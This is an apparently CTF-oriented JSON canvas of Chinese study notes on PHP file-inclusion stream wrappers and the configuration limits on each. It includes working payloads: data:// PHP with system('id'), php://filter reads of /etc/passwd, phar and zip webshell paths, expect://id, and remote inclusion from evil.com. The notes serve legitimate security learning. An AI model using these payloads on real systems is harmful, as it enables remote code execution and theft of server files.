{
	"nodes":[
		{"id":"17aaa28946bcd7eb","x":-226,"y":-200,"width":134,"height":53,"type":"text","text":"常用伪协议"},
		{"id":"a37414ef69d38eb9","x":-440,"y":40,"width":145,"height":56,"type":"text","text":"php://filter"},
		{"id":"015cde577bda0a31","x":-30,"y":-260,"width":94,"height":50,"type":"text","text":"写入"},
		{"id":"e5fc80cd1630b981","x":140,"y":-358,"width":420,"height":123,"type":"text","text":"- **`php://input`** — 读取 POST body，配合文件包含执行任意 PHP（需允许 `allow_url_include`）\n- **`php://memory` / `php://temp`** — 内存文件流，较少用"},
		{"id":"4584c62993fbd6af","x":63,"y":152,"width":637,"height":288,"type":"text","text":"## 远程/本地文件\n\n- **`file://`** — 读取本地绝对路径文件\n\n```\n  file:///etc/passwd\n```\n\n- **`http://` / `https://`** — 包含远程文件（需开启 `allow_url_include`）\n- **`ftp://`** — 同上，通过 FTP 包含"},
		{"id":"fa16dcde6376ad88","x":-713,"y":626,"width":554,"height":334,"type":"text","text":"\n## 其他\n\n- **`glob://`** — 枚举目录文件，不能直接读内容但可用于信息收集\n- **`expect://`** — 执行系统命令（需安装 expect 扩展，罕见）\n\n```\n  expect://id\n```\n\n- **`ssh2://`** — 通过 SSH 读文件（需扩展）"},
		{"id":"bdf0d1b5531664a9","x":-55,"y":472,"width":457,"height":321,"type":"text","text":"## 压缩流\n\n- **`zip://`** — 包含 zip 内的文件，常用于上传绕过\n\n```\n  zip://upload/shell.jpg%23shell.php\n```\n\n- **`phar://`** — ⭐ 高频考点，可触发反序列化\n\n```\n  phar://upload/shell.jpg/shell.php\n```\n\n- **`zlib://` / `bzip2://`** — 读取压缩文件内容"},
		{"id":"dfeec8d25abab2b6","x":231,"y":-173,"width":342,"height":293,"type":"text","text":"### 限制条件\n\n|条件|说明|\n|---|---|\n|`allow_url_fopen = On`|必须开启|\n|`allow_url_include = On`|**必须开启**，这是最大限制|\n|PHP 版本|无特殊要求|"},
		{"id":"2b9131149b1b3342","x":-278,"y":-840,"width":119,"height":57,"type":"text","text":"php文件包含"},
		{"id":"63771fbb2e20c4c9","x":-412,"y":-687,"width":429,"height":391,"type":"text","text":"## 调用这些协议的原理\n\n### 核心：PHP Stream 流封装器\n\nPHP 内部有一套 **Stream API**，所有 I/O 操作（`include`、`fopen`、`file_get_contents` 等）在底层都通过这套 API 处理。URL/路径的前缀（scheme）决定调用哪个**封装器（Stream Wrapper）**。\n\n```\ninclude(\"data://text/plain,hello\")\n         ↑\n    PHP 解析 scheme = \"data\"\n         ↓\n    查找注册的 stream wrapper\n         ↓\n    调用 data:// wrapper 的 stream_open()\n         ↓\n    返回数据流给 include\n         ↓\n    include 把流内容当 PHP 执行\n```\n\n### 封装器分类\n\n**内置封装器**（PHP 自带，随时注册好的）：\n\n```\nfile://    → 本地文件系统\nphp://     → PHP 自身 I/O 流\ndata://    → RFC 2397 内联数据\nhttp://    → HTTP 客户端（需 allow_url_fopen）\nftp://     → FTP 客户端（需 allow_url_fopen）\nzip://     → ZIP 归档读取\nzlib://    → zlib 压缩流\nbzip2://   → bzip2 压缩流\nphar://    → PHP 归档（有自己的元数据解析）\nglob://    → 文件名模式匹配\n```\n\n**用户自定义封装器**（PHP 支持用 `stream_wrapper_register()` 注册自己的 scheme，CTF 里极少见）"},
		{"id":"a23b4cb2f97dfd42","x":-230,"y":-84,"width":143,"height":58,"type":"text","text":"读取文件内容"},
		{"id":"2e0d84b22de7be13","x":-800,"y":-326,"width":250,"height":60,"type":"text","text":"phar://反序列化"},
		{"id":"6997ff285c5364e2","x":-1032,"y":-760,"width":482,"height":319,"type":"text","text":"### phar:// 为什么能触发反序列化\n\nphar 文件格式里有一个 **manifest 段**，其中存储了文件元数据，这些元数据是**序列化的 PHP 对象**。当任何文件操作函数（不只是 include，连 `file_exists()`、`md5_file()` 都算）触碰到 `phar://` 路径时，PHP 会自动解析 manifest 并**反序列化**其中的对象，从而触发 `__wakeup()`、`__destruct()` 等魔术方法。\n\n```\nfile_exists(\"phar://upload/evil.jpg\")\n    ↓\nphar wrapper 解析文件结构\n    ↓\n自动 unserialize(manifest 中的 meta-data)\n    ↓\n触发类的 __destruct() → RCE\n```\n\n这就是为什么 phar 反序列化攻击面那么广——**不需要代码里有显式的 `unserialize()` 调用**。"},
		{"id":"36708fffd27424dc","x":-1060,"y":-99,"width":481,"height":278,"type":"text","text":"### php://filter 链为什么能 RCE\n\n这是近两年的新玩法（`php_filter_chain`）。`php://filter` 支持链式叠加多个 filter：\n\n```\nphp://filter/convert.iconv.UTF-8.UTF-7|\n             convert.iconv.UTF-7.UTF-16|\n             ...（几十个 filter 叠加）\n             /resource=/dev/stdin\n```\n\n通过精心构造的 iconv 编码转换链，可以从**空文件或无关内容**中\"凭空\"生成任意 PHP 代码字符串，再被 include 执行——完全绕过 `allow_url_include` 限制，这就是 `php_filter_chain_generator` 工具的原理。"},
		{"id":"ff8fe8bae1cbe16b","x":-710,"y":387,"width":415,"height":170,"type":"text","text":"**`php://filter` 不需要 `allow_url_include = On`**，这是它和 `data://`、`php://input` 最重要的区别。\n\n### 为什么？\n\nPHP 对 URL 类 scheme 有两道开关：\n\n```\nallow_url_fopen    → 控制能否打开远程 URL（http/ftp 等）\nallow_url_include  → 在 allow_url_fopen 基础上，进一步控制\n                     能否把远程 URL 传给 include/require\n```\n\nPHP 源码里对 `php://` 的处理是**硬编码豁免**的——它被视为\"本地流\"而非\"远程 URL\"，所以两个开关都不检查。\n\n```\nhttp://evil.com/shell.php   ← 远程URL，受两个开关限制\ndata://text/plain,<?php..>  ← 被当作远程URL，受限\nphp://filter/...            ← 内部流，豁免，直接放行\nphp://input                 ← 同属 php://，但例外！\n```\n\n### php://input 为什么例外\n\n`php://input` 虽然也是 `php://` 前缀，但它的用途是\"把 POST body 当文件执行\"，PHP 认为这个行为和远程包含一样危险，所以**单独加了 `allow_url_include` 检查**。\n\n可以理解为：\n\n- `php://filter` — 只是读文件、做编码变换，PHP 认为无害，不限制\n- `php://input` — 执行外部输入的代码，PHP 认为危险，加限制"},
		{"id":"0dbe7bcc57c9dcc2","x":-814,"y":260,"width":471,"height":80,"type":"text","text":"php://filter/convert.base64-encode/resource=index.php\n  php://filter/read=string.rot13/resource=flag.php"},
		{"id":"4f5fd88eaa3fcb0b","x":260,"y":-940,"width":542,"height":205,"type":"text","text":"php://filter      ← 几乎随时可用，只要能 include/fopen\nphp://input       ← 需要 allow_url_include = On\ndata://           ← 需要 allow_url_fopen + allow_url_include = On\nhttp://           ← 需要 allow_url_fopen + allow_url_include = On\nfile://           ← 几乎随时可用\nzip://            ← 需要能上传文件\nphar://           ← 需要能上传文件"},
		{"id":"73524dfdd6a144c2","x":316,"y":-680,"width":562,"height":240,"type":"text","text":"### 各协议限制对照（完整版）\n\n```\n协议                  allow_url_fopen   allow_url_include\n─────────────────────────────────────────────────────────\nphp://filter          不需要            不需要            ← 最宽松\nphp://input           不需要            需要\nfile://               不需要            不需要\nphar://               不需要            不需要\nzip://                不需要            不需要\ndata://               需要              需要\nhttp://               需要              需要\nftp://                需要              需要\n```"},
		{"id":"79cbc823fe296304","x":642,"y":-80,"width":236,"height":111,"type":"text","text":"```\ndata://[mediatype][;base64],<data>\n```"},
		{"id":"83be9b5f216bcc68","x":960,"y":-117,"width":535,"height":182,"type":"text","text":"- **`data://`** — 直接在 URL 中内嵌内容执行\n\n```\n  data://text/plain,<?php system('id');?>\n  data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+\n```"},
		{"id":"b7406fa83dbcb110","x":1600,"y":-174,"width":500,"height":300,"type":"text","text":"```\n# 明文\ndata://text/plain,<?php system('id');?>\n\n# base64（绕过关键字过滤时常用）\ndata://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+\n\n# media type 随便写，PHP 不校验\ndata://application/x-httpd-php;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+\n```"},
		{"id":"141073abb9e6dcb8","x":597,"y":-359,"width":526,"height":63,"type":"text","text":"`glob://` 协议对 PHP 的 `allow_url_fopen` 和 `allow_url_include` 配置不做要求（On/Off 均可），也不受它们的影响。"},
		{"id":"de6ef8de8586afe1","x":960,"y":-560,"width":421,"height":145,"type":"text","text":"根据 PHP 官方文档，`glob://` 包装器**不支持 `stream_open`**（它只支持 `dir_opendir` 用于目录列表）。  \n所以当你尝试 `include('glob://flag*')` 时，PHP 会抛出：\n\n> `wrapper does not support stream open`"},
		{"id":"4f78eb1c1378c60e","x":860,"y":-975,"width":529,"height":240,"type":"text","text":"PHP 的 stream wrapper 分两类：\n\n|类型|特点|例子|\n|---|---|---|\n|**Transport wrapper**|负责\"怎么传输\"，是终端，不能再套其他 wrapper|`file://`, `http://`, `ftp://`|\n|**Filter/Chain wrapper**|负责\"怎么处理数据\"，设计上支持链式嵌套|`php://filter`, `compress.zlib://`|"},
		{"id":"f5d0dd902ce843ee","x":455,"y":-1340,"width":505,"height":269,"type":"text","text":"### 哪些情况可以嵌套？\n\n**`php://filter` 是专门设计来嵌套的**，语法：\n\n```\nphp://filter/[filters]/resource=<其他wrapper>\n```\n\n它的 `resource=` 参数会递归解析另一个 wrapper，所以可以合法嵌套：\n\n```\n# 嵌套 file://\nphp://filter/convert.base64-encode/resource=file:///etc/passwd\n\n# 嵌套 http://\nphp://filter/convert.base64-encode/resource=http://evil.com/shell.txt\n\n# 多层 filter 链（filter 之间用 | 分隔）\nphp://filter/read=string.rot13|convert.base64-encode/resource=/etc/passwd\n\n# 嵌套 compress\nphp://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd\n```\n\n**`compress.zlib://` 和 `compress.bzip2://`** 也支持嵌套：\n\n```\ncompress.zlib://http://evil.com/file.gz\ncompress.bzip2:///tmp/file.bz2\n```"}
	],
